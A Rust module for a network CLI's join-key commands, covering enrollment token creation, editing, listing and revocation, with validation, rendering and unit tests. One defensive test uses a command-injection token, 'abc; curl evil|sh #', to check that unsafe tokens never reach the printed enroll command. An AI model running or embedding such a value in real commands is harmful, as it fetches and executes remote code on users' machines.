//! `join-key list` / `get` / `create` / `edit` / `delete`: reusable
//! enrollment tokens. A join key enrolls any number of machines, each as a
//! new host on the key's network with its role, tags, and address prefixes.
//! The token (`dnjoin-<id>-<secret>`) is returned by the create call only;
//! every other read leaves it out.

use anyhow::{Context, anyhow, bail};
use serde_json::{Value, json};

use super::delete::{DeleteTarget, Described, confirm_and_delete};
use super::hosts::{checked_enroll_code, network_ipv4_cidr, parse_tag, pick_network, role_name};
use crate::api::Client;
use crate::cli::{JoinKeyCreateArgs, JoinKeyDeleteArgs, JoinKeyEditArgs, JoinKeyGetArgs, PageArgs};
use crate::ids::{validate_id, validate_id_shape};
use crate::output::{
    OutputMode, data_object, joined_field, print_list, render_details, sanitize_for_display,
    str_field,
};
use crate::rfc3339;

/// The name rules `POST /v1/join-keys` enforces: a DNS label of at most 54
/// characters. Hosts that enroll without a usable hostname are named after
/// the key, which is why it has to be one.
const MAX_NAME_CHARS: usize = 54;

pub fn join_keys_list(client: &Client, page: &PageArgs, output: OutputMode) -> anyhow::Result<()> {
    let headers = ["ID", "NAME", "NETWORK", "ROLE", "TAGS", "CIDRS", "EXPIRES"];
    let now = rfc3339::now();
    print_list(
        &client.list_join_keys(page)?,
        output,
        "No join keys found.",
        &headers,
        |rows| rows.iter().map(|row| join_key_row(row, now)).collect(),
    )
}

pub fn join_keys_get(
    client: &Client,
    args: &JoinKeyGetArgs,
    output: OutputMode,
) -> anyhow::Result<()> {
    let id = args.join_key_id.trim();
    validate_id("join key", id)?;
    let res = client.get_join_key(id)?;
    output.emit(&res, |res| {
        let data = data_object(res, "join key")?;
        print!(
            "{}",
            render_join_key(data, key_role_name(client, data).as_deref())
        );
        Ok(())
    })
}

/// Reject what the API would reject anyway, before credentials are resolved
/// or the wire is touched: a name that isn't a DNS label, malformed ids and
/// tags, and an expiry that isn't a timestamp or is already in the past.
pub fn validate_join_key_create_preflight(args: &JoinKeyCreateArgs) -> anyhow::Result<()> {
    check_name(&args.name)?;
    if let Some(network) = &args.network {
        validate_id_shape("network", "network", network).map_err(|e| anyhow!("--network: {e}"))?;
    }
    if let Some(role) = &args.role {
        validate_id_shape("role", "role", role).map_err(|e| anyhow!("--role: {e}"))?;
    }
    for tag in &args.tag {
        parse_tag(tag).map_err(|e| anyhow!("--tag: {e}"))?;
    }
    for cidr in &args.cidr {
        check_cidr(cidr)?;
    }
    expiry(args.expires_at.as_deref(), args.expires_in.as_deref())?;
    Ok(())
}

pub fn validate_join_key_edit_preflight(args: &JoinKeyEditArgs) -> anyhow::Result<()> {
    validate_id("join key", args.join_key_id.trim())?;
    if args.name.is_none()
        && args.expires_at.is_none()
        && args.expires_in.is_none()
        && !args.no_expiry
    {
        bail!("nothing to edit — pass --name, --expires-at, --expires-in, or --no-expiry");
    }
    if let Some(name) = &args.name {
        check_name(name)?;
    }
    expiry(args.expires_at.as_deref(), args.expires_in.as_deref())?;
    Ok(())
}

/// Create a join key. Like `host create`, the network is auto-picked when the
/// account has exactly one, and on a dual-stack network the IPv4 prefix is
/// sent unless `--cidr` or `--no-ipv4` settles the question, since the API
/// otherwise hands enrolled hosts an IPv6 address only.
pub fn join_keys_create(
    client: &Client,
    args: &JoinKeyCreateArgs,
    output: OutputMode,
) -> anyhow::Result<()> {
    let auto_ipv4 = args.cidr.is_empty() && !args.no_ipv4;
    let (network_id, ipv4_cidr) = match &args.network {
        Some(id) if auto_ipv4 => {
            let network = client.get_network(id).with_context(|| {
                format!(
                    "could not read network {id} to auto-assign IPv4 addresses (the API key \
                     needs networks:read; pass --cidr <CIDR> or --no-ipv4 to skip the lookup)"
                )
            })?;
            (id.clone(), network_ipv4_cidr(&network["data"]))
        }
        Some(id) => (id.clone(), None),
        None => {
            let networks = client.all_networks()?;
            let network = pick_network(&networks)?;
            let id = network["id"]
                .as_str()
                .ok_or_else(|| anyhow!("network list response missing 'id' on the only entry"))?;
            (
                id.to_owned(),
                network_ipv4_cidr(network).filter(|_| auto_ipv4),
            )
        }
    };
    let expires_at = expiry(args.expires_at.as_deref(), args.expires_in.as_deref())?;
    let body = build_create_body(
        args,
        &network_id,
        ipv4_cidr.as_deref(),
        expires_at.as_deref(),
    );
    let res = client.create_join_key(&body)?;
    output.emit(&res, |res| {
        let data = data_object(res, "join key")?;
        print!("{}", render_created(data, rfc3339::now()));
        Ok(())
    })
}

/// Change a join key's name or expiry through the API's partial update.
pub fn join_keys_edit(
    client: &Client,
    args: &JoinKeyEditArgs,
    output: OutputMode,
) -> anyhow::Result<()> {
    let id = args.join_key_id.trim();
    validate_id("join key", id)?;
    let body = build_edit_body(args)?;
    let res = client.patch_join_key(id, &body)?;
    output.emit(&res, |res| {
        let data = data_object(res, "join key")?;
        print!(
            "{}",
            render_join_key(data, key_role_name(client, data).as_deref())
        );
        Ok(())
    })
}

/// Revoke one join key. The confirmation names the key and says when it
/// would have expired on its own.
pub fn join_keys_delete(
    client: &Client,
    args: &JoinKeyDeleteArgs,
    output: OutputMode,
) -> anyhow::Result<()> {
    let id = args.join_key_id.trim();
    validate_id("join key", id)?;
    let target = DeleteTarget {
        kind: "join key",
        id,
        json_key: "id",
        read_scope: "join-keys:read",
        named: true,
    };
    confirm_and_delete(
        &target,
        args.yes,
        output,
        || {
            let data = &client.get_join_key(id)?["data"];
            Ok(Described {
                name: sanitize_for_display(str_field(data, "name")),
                detail: match expires_text(data, rfc3339::now()).as_str() {
                    "" => String::new(),
                    "never" => "never expires".to_string(),
                    when => format!("expires {when}"),
                },
            })
        },
        || client.delete_join_key(id),
    )
}

/// The `POST /v1/join-keys` body. Optional fields are left out when unset
/// rather than sent as `null`. `ipv4_auto_cidr` is the network's IPv4
/// prefix, sent when no `--cidr` was given so enrolled hosts get an IPv4.
fn build_create_body(
    args: &JoinKeyCreateArgs,
    network_id: &str,
    ipv4_auto_cidr: Option<&str>,
    expires_at: Option<&str>,
) -> Value {
    let cidrs: Vec<&str> = if args.cidr.is_empty() {
        ipv4_auto_cidr.into_iter().collect()
    } else {
        args.cidr.iter().map(String::as_str).collect()
    };
    let optional = [
        ("roleID", args.role.as_ref().map(|r| json!(r))),
        ("tags", (!args.tag.is_empty()).then(|| json!(args.tag))),
        ("autoAssignCIDRs", (!cidrs.is_empty()).then(|| json!(cidrs))),
        ("expiresAt", expires_at.map(|e| json!(e))),
    ];
    let mut body = json!({ "name": args.name.trim(), "networkID": network_id });
    for (key, value) in optional {
        if let Some(value) = value {
            body[key] = value;
        }
    }
    body
}

/// The `PATCH /v1/join-keys/{id}` body: only the fields that change.
/// `--no-expiry` sends `expiresAt: null`, which removes the expiry.
fn build_edit_body(args: &JoinKeyEditArgs) -> anyhow::Result<Value> {
    let mut body = json!({});
    if let Some(name) = &args.name {
        body["name"] = json!(name.trim());
    }
    if args.no_expiry {
        body["expiresAt"] = Value::Null;
    } else if let Some(at) = expiry(args.expires_at.as_deref(), args.expires_in.as_deref())? {
        body["expiresAt"] = json!(at);
    }
    Ok(body)
}

/// The `expiresAt` to send for `--expires-at` / `--expires-in`, or `None`
/// when neither was given. A timestamp is checked for shape and must be in
/// the future, as the API requires; a duration is added to the clock now.
fn expiry(at: Option<&str>, after: Option<&str>) -> anyhow::Result<Option<String>> {
    let now = rfc3339::now();
    if let Some(at) = at {
        let at = at.trim();
        let secs = rfc3339::parse(at).map_err(|e| anyhow!("--expires-at: {e}"))?;
        if secs <= now {
            bail!("--expires-at: must be in the future");
        }
        return Ok(Some(at.to_string()));
    }
    if let Some(after) = after {
        let secs = rfc3339::parse_duration(after).map_err(|e| anyhow!("--expires-in: {e}"))?;
        let secs = i64::try_from(secs).map_err(|_| anyhow!("--expires-in: too long"))?;
        return Ok(Some(rfc3339::format(now + secs)));
    }
    Ok(None)
}

/// A key name as the API accepts it: lowercase letters, digits, and hyphens,
/// not at either end, 1 to 54 characters.
fn check_name(name: &str) -> anyhow::Result<()> {
    let name = name.trim();
    let label = name
        .bytes()
        .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
        && !name.starts_with('-')
        && !name.ends_with('-');
    if name.is_empty() || name.len() > MAX_NAME_CHARS || !label {
        bail!(
            "join key name must be 1 to {MAX_NAME_CHARS} lowercase letters, digits, and \
             hyphens, not starting or ending with a hyphen (got {:?})",
            sanitize_for_display(name)
        );
    }
    Ok(())
}

/// A `--cidr` value shaped like a prefix, `addr/len`, with the address an
/// IPv4 or IPv6 one. Whether it is the network's own prefix is up to the API.
fn check_cidr(cidr: &str) -> anyhow::Result<()> {
    let ok = cidr.split_once('/').is_some_and(|(addr, len)| {
        let len: Option<u8> = len.parse().ok();
        match addr.parse::<std::net::IpAddr>() {
            Ok(std::net::IpAddr::V4(_)) => len.is_some_and(|l| l <= 32),
            Ok(std::net::IpAddr::V6(_)) => len.is_some_and(|l| l <= 128),
            Err(_) => false,
        }
    });
    if !ok {
        bail!(
            "--cidr: expected a prefix like 100.100.0.0/22 or fd00::/64 (got {:?})",
            sanitize_for_display(cidr)
        );
    }
    Ok(())
}

/// The role name for the human view, looked up only when the key assigns a
/// role whose id is safe to put in a path. Needs `roles:read`; a failure
/// shows the id, with a note on stderr.
fn key_role_name(client: &Client, data: &Value) -> Option<String> {
    data["roleID"]
        .as_str()
        .filter(|id| !id.is_empty() && validate_id("role", id).is_ok())
        .and_then(|id| role_name(client, id))
}

/// The columns of the human join key table.
fn join_key_row(row: &Value, now: i64) -> Vec<String> {
    vec![
        str_field(row, "id").to_string(),
        str_field(row, "name").to_string(),
        str_field(row, "networkID").to_string(),
        match row["roleID"].as_str() {
            Some(id) if !id.is_empty() => id.to_string(),
            _ => "default".to_string(),
        },
        joined_field(row, "tags"),
        joined_field(row, "autoAssignCIDRs"),
        expires_text(row, now),
    ]
}

/// `expiresAt` for a person: `never` for `null`, the timestamp otherwise,
/// marked `(expired)` once it has passed. Empty when the field is absent.
fn expires_text(data: &Value, now: i64) -> String {
    match data.get("expiresAt") {
        Some(Value::Null) => "never".to_string(),
        Some(Value::String(at)) => match rfc3339::parse(at) {
            Ok(secs) if secs <= now => format!("{at} (expired)"),
            _ => at.clone(),
        },
        _ => String::new(),
    }
}

/// The human view of one join key, without its token (reads never carry
/// it): the name, then one aligned line per field that has a value.
fn render_join_key(data: &Value, role_name: Option<&str>) -> String {
    let id = str_field(data, "id");
    let name = sanitize_for_display(str_field(data, "name"));
    let mut out = match name.trim() {
        "" => format!("{}\n", sanitize_for_display(id)),
        shown => format!("{shown}\n"),
    };
    out.push_str(&details(data, role_name, rfc3339::now()));
    out
}

fn details(data: &Value, role_name: Option<&str>, now: i64) -> String {
    let role = match (data["roleID"].as_str().filter(|r| !r.is_empty()), role_name) {
        (Some(id), Some(name)) => format!("{name} ({id})"),
        (Some(id), None) => id.to_string(),
        (None, _) => "default role".to_string(),
    };
    render_details(&[
        ("ID", str_field(data, "id").to_string()),
        ("Network", str_field(data, "networkID").to_string()),
        ("Role", role),
        ("Tags", joined_field(data, "tags")),
        ("Auto-assign CIDRs", joined_field(data, "autoAssignCIDRs")),
        ("Expires", expires_text(data, now)),
        ("Created", str_field(data, "createdAt").to_string()),
        ("Modified", str_field(data, "modifiedAt").to_string()),
    ])
}

/// The human view of a new join key: what it is, the `dnclient` command for
/// each machine, and a reminder that the token can't be read back. The token
/// goes into a line the user pastes into a shell, so it is printed only when
/// it looks like one the API issues; the key exists either way, so a bad one
/// is reported with the way to replace it rather than as an error.
fn render_created(data: &Value, now: i64) -> String {
    let id = sanitize_for_display(str_field(data, "id"));
    let name = sanitize_for_display(str_field(data, "name"));
    let mut out = match name.trim() {
        "" => format!("Created join key {id}\n"),
        shown => format!("Created join key \"{shown}\" ({id})\n"),
    };
    out.push_str(&details(data, None, now));
    out.push('\n');
    match checked_enroll_code(str_field(data, "token")) {
        Ok(token) => {
            out.push_str("On each machine, install dnclient and run:\n");
            out.push_str(&format!("  dnclient enroll -code {token}\n\n"));
            out.push_str(
                "The token is shown only this once; store it somewhere safe. Every machine\n\
                 that enrolls with it joins as a new host.\n",
            );
        }
        Err(_) => {
            out.push_str(
                "The response had no usable token, and the API never shows one again.\n\
                 Revoke this key and create another:\n",
            );
            out.push_str(&format!("  dn join-key delete {id}\n"));
        }
    }
    if data["roleID"].as_str().is_none_or(str::is_empty) {
        out.push_str(
            "\nNote: the default role denies all inbound traffic. Hosts enrolled with this\n\
             key will be on the network but unreachable until a role with firewall rules\n\
             is assigned to them (see `dn role list`), unless one of the key's tags\n\
             carries firewall rules (see `dn tag get`).\n",
        );
    }
    out
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    const ID: &str = "dnjoin-P3RCTXN5LVFGBMJNYF2QHKWDOA";
    const NETWORK: &str = "network-KAOWMXZHZWCVMGGFKM22XEGYLE";
    const ROLE: &str = "role-PZEDBXHCEXKAKJPZ6XOQTIAJA4";
    const TOKEN: &str =
        "dnjoin-P3RCTXN5LVFGBMJNYF2QHKWDOA-6YQKZ3VNB2XGJ4MEPLRT7WCSAHDUF5IO3QXBKZNYV2MJ4RLEHGTA";
    /// 2027-01-01T00:00:00Z.
    const NOW: i64 = 1_798_761_600;

    fn create_args(name: &str) -> JoinKeyCreateArgs {
        JoinKeyCreateArgs {
            name: name.into(),
            network: None,
            role: None,
            tag: Vec::new(),
            cidr: Vec::new(),
            no_ipv4: false,
            expires_at: None,
            expires_in: None,
        }
    }

    fn edit_args() -> JoinKeyEditArgs {
        JoinKeyEditArgs {
            join_key_id: ID.into(),
            name: None,
            expires_at: None,
            expires_in: None,
            no_expiry: false,
        }
    }

    fn key() -> Value {
        json!({
            "id": ID, "organizationID": "org-F63A24JGCLJV3ZEUTLCBISGETA", "name": "ci-runner",
            "networkID": NETWORK, "roleID": ROLE, "tags": ["env:ci"],
            "autoAssignCIDRs": ["100.100.0.0/22", "fdef:c0:c0:1::/80"],
            "expiresAt": "2099-01-01T00:00:00Z", "createdAt": "2026-10-29T15:00:00Z",
            "modifiedAt": "2026-10-29T15:00:00Z"
        })
    }

    #[test]
    fn names_must_be_dns_labels() {
        for ok in ["a", "ci-runner", "k8s-node-1", "x".repeat(54).as_str()] {
            assert!(check_name(ok).is_ok(), "{ok:?}");
        }
        for bad in [
            "",
            "  ",
            "-ci",
            "ci-",
            "CI",
            "ci_runner",
            "ci runner",
            "ci.runner",
            "x".repeat(55).as_str(),
            "é",
        ] {
            let err = check_name(bad).unwrap_err().to_string();
            assert!(err.contains("join key name must be"), "{bad:?}: {err}");
        }
        assert!(
            !check_name("\u{1b}[31m")
                .unwrap_err()
                .to_string()
                .contains('\u{1b}')
        );
    }

    #[test]
    fn cidrs_must_be_prefixes() {
        for ok in [
            "100.100.0.0/22",
            "10.0.0.0/8",
            "fd00::/64",
            "fdef:c0:c0:1::/80",
        ] {
            assert!(check_cidr(ok).is_ok(), "{ok:?}");
        }
        for bad in [
            "100.100.0.1",
            "100.100.0.0/33",
            "fd00::/129",
            "x/8",
            "/22",
            "",
        ] {
            assert!(check_cidr(bad).is_err(), "{bad:?}");
        }
    }

    #[test]
    fn create_preflight_checks_ids_tags_cidrs_and_expiry() {
        let mut a = create_args("ci-runner");
        assert!(validate_join_key_create_preflight(&a).is_ok());
        a.network = Some(NETWORK.into());
        a.role = Some(ROLE.into());
        a.tag = vec!["env:ci".into()];
        a.cidr = vec!["100.100.0.0/22".into()];
        a.expires_at = Some("2099-01-01T00:00:00Z".into());
        assert!(validate_join_key_create_preflight(&a).is_ok());

        for (mutate, want) in [
            (
                Box::new(|a: &mut JoinKeyCreateArgs| a.name = "CI".into())
                    as Box<dyn Fn(&mut JoinKeyCreateArgs)>,
                "join key name",
            ),
            (
                Box::new(|a: &mut JoinKeyCreateArgs| a.network = Some("network-1".into())),
                "--network: network id must look like network-",
            ),
            (
                Box::new(|a: &mut JoinKeyCreateArgs| a.role = Some("role/x".into())),
                "--role: role id contains invalid character '/'",
            ),
            (
                Box::new(|a: &mut JoinKeyCreateArgs| a.tag = vec!["nocolon".into()]),
                "--tag: ",
            ),
            (
                Box::new(|a: &mut JoinKeyCreateArgs| a.cidr = vec!["100.100.0.1".into()]),
                "--cidr: ",
            ),
            (
                Box::new(|a: &mut JoinKeyCreateArgs| a.expires_at = Some("tomorrow".into())),
                "--expires-at: expected an RFC 3339",
            ),
            (
                Box::new(|a: &mut JoinKeyCreateArgs| {
                    a.expires_at = Some("2020-01-01T00:00:00Z".into())
                }),
                "--expires-at: must be in the future",
            ),
            (
                Box::new(|a: &mut JoinKeyCreateArgs| {
                    a.expires_at = None;
                    a.expires_in = Some("7x".into())
                }),
                "--expires-in: expected a duration",
            ),
        ] {
            let mut a = create_args("ci-runner");
            mutate(&mut a);
            let err = validate_join_key_create_preflight(&a)
                .unwrap_err()
                .to_string();
            assert!(err.contains(want), "{err}");
        }
    }

    #[test]
    fn edit_preflight_wants_a_change() {
        let err = validate_join_key_edit_preflight(&edit_args())
            .unwrap_err()
            .to_string();
        assert!(err.contains("nothing to edit"), "{err}");
        let mut a = edit_args();
        a.no_expiry = true;
        assert!(validate_join_key_edit_preflight(&a).is_ok());
        let mut a = edit_args();
        a.name = Some("ci".into());
        assert!(validate_join_key_edit_preflight(&a).is_ok());
        a.name = Some("-ci".into());
        assert!(validate_join_key_edit_preflight(&a).is_err());
        let mut a = edit_args();
        a.join_key_id = "dnjoin-1/../x".into();
        a.no_expiry = true;
        assert!(validate_join_key_edit_preflight(&a).is_err());
    }

    #[test]
    fn create_body_minimal_sends_name_and_network_only() {
        let body = build_create_body(&create_args(" ci-runner "), NETWORK, None, None);
        assert_eq!(body, json!({"name": "ci-runner", "networkID": NETWORK}));
    }

    #[test]
    fn create_body_sends_every_option_and_the_auto_ipv4_prefix() {
        let mut a = create_args("ci-runner");
        a.role = Some(ROLE.into());
        a.tag = vec!["env:ci".into(), "team:infra".into()];
        let body = build_create_body(
            &a,
            NETWORK,
            Some("100.100.0.0/22"),
            Some("2099-01-01T00:00:00Z"),
        );
        assert_eq!(
            body,
            json!({
                "name": "ci-runner", "networkID": NETWORK, "roleID": ROLE,
                "tags": ["env:ci", "team:infra"], "autoAssignCIDRs": ["100.100.0.0/22"],
                "expiresAt": "2099-01-01T00:00:00Z"
            })
        );
    }

    #[test]
    fn create_body_explicit_cidrs_replace_the_auto_prefix() {
        let mut a = create_args("ci-runner");
        a.cidr = vec!["100.100.0.0/22".into(), "fdef:c0:c0:1::/80".into()];
        let body = build_create_body(&a, NETWORK, Some("ignored"), None);
        assert_eq!(
            body["autoAssignCIDRs"],
            json!(["100.100.0.0/22", "fdef:c0:c0:1::/80"])
        );
        let a = create_args("ci-runner");
        assert!(
            build_create_body(&a, NETWORK, None, None)
                .get("autoAssignCIDRs")
                .is_none()
        );
    }

    #[test]
    fn edit_body_sends_only_what_changes() {
        let mut a = edit_args();
        a.name = Some("ci".into());
        assert_eq!(build_edit_body(&a).unwrap(), json!({"name": "ci"}));
        let mut a = edit_args();
        a.no_expiry = true;
        assert_eq!(build_edit_body(&a).unwrap(), json!({"expiresAt": null}));
        let mut a = edit_args();
        a.expires_at = Some("2099-01-01T00:00:00Z".into());
        assert_eq!(
            build_edit_body(&a).unwrap(),
            json!({"expiresAt": "2099-01-01T00:00:00Z"})
        );
        let mut a = edit_args();
        a.expires_in = Some("1h".into());
        let at = build_edit_body(&a).unwrap()["expiresAt"]
            .as_str()
            .unwrap()
            .to_string();
        let secs = rfc3339::parse(&at).unwrap();
        assert!((secs - rfc3339::now() - 3600).abs() < 60, "{at}");
    }

    #[test]
    fn expires_text_marks_null_and_the_past() {
        assert_eq!(expires_text(&json!({"expiresAt": null}), NOW), "never");
        assert_eq!(
            expires_text(&json!({"expiresAt": "2099-01-01T00:00:00Z"}), NOW),
            "2099-01-01T00:00:00Z"
        );
        assert_eq!(
            expires_text(&json!({"expiresAt": "2026-12-31T23:59:59Z"}), NOW),
            "2026-12-31T23:59:59Z (expired)"
        );
        // An unparseable value is shown as-is rather than guessed at.
        assert_eq!(expires_text(&json!({"expiresAt": "soon"}), NOW), "soon");
        assert_eq!(expires_text(&json!({}), NOW), "");
    }

    #[test]
    fn row_shows_the_default_role_and_joins_lists() {
        assert_eq!(
            join_key_row(&key(), NOW),
            [
                ID,
                "ci-runner",
                NETWORK,
                ROLE,
                "env:ci",
                "100.100.0.0/22, fdef:c0:c0:1::/80",
                "2099-01-01T00:00:00Z"
            ]
        );
        let mut k = key();
        k["roleID"] = Value::Null;
        k["expiresAt"] = Value::Null;
        let row = join_key_row(&k, NOW);
        assert_eq!(row[3], "default");
        assert_eq!(row[6], "never");
    }

    #[test]
    fn render_join_key_names_the_role_and_skips_empty_fields() {
        let out = render_join_key(&key(), Some("CI runners"));
        assert_eq!(
            out,
            format!(
                "ci-runner\n\
                 ID:                 {ID}\n\
                 Network:            {NETWORK}\n\
                 Role:               CI runners ({ROLE})\n\
                 Tags:               env:ci\n\
                 Auto-assign CIDRs:  100.100.0.0/22, fdef:c0:c0:1::/80\n\
                 Expires:            2099-01-01T00:00:00Z\n\
                 Created:            2026-10-29T15:00:00Z\n\
                 Modified:           2026-10-29T15:00:00Z\n"
            )
        );
        let mut k = key();
        k["name"] = json!("");
        k["roleID"] = Value::Null;
        k["tags"] = json!([]);
        let out = render_join_key(&k, None);
        assert!(out.starts_with(&format!("{ID}\n")), "{out}");
        assert!(out.contains("Role:               default role\n"), "{out}");
        assert!(!out.contains("Tags:"), "{out}");
    }

    #[test]
    fn render_join_key_sanitizes_an_id_used_as_the_title() {
        let out = render_join_key(&json!({"id": "dnjoin-\u{1b}[31m", "name": ""}), None);
        assert!(out.starts_with("dnjoin- [31m\n"), "{out:?}");
    }

    #[test]
    fn created_prints_the_enroll_command_once_only_warning_and_role_note() {
        let mut k = key();
        k["token"] = json!(TOKEN);
        let out = render_created(&k, NOW);
        assert!(
            out.starts_with(&format!("Created join key \"ci-runner\" ({ID})\n")),
            "{out}"
        );
        assert!(
            out.contains(&format!("\n  dnclient enroll -code {TOKEN}\n")),
            "{out}"
        );
        assert!(out.contains("shown only this once"), "{out}");
        assert!(!out.contains("default role denies"), "{out}");

        k["roleID"] = Value::Null;
        let out = render_created(&k, NOW);
        assert!(out.contains("default role denies"), "{out}");
    }

    #[test]
    fn created_never_pastes_an_unsafe_token_into_a_command() {
        for token in [json!(null), json!(""), json!("abc; curl evil|sh #")] {
            let mut k = key();
            k["token"] = token;
            let out = render_created(&k, NOW);
            assert!(!out.contains("dnclient enroll"), "{out}");
            assert!(!out.contains("curl"), "{out}");
            assert!(out.contains(&format!("dn join-key delete {ID}")), "{out}");
        }
    }
}
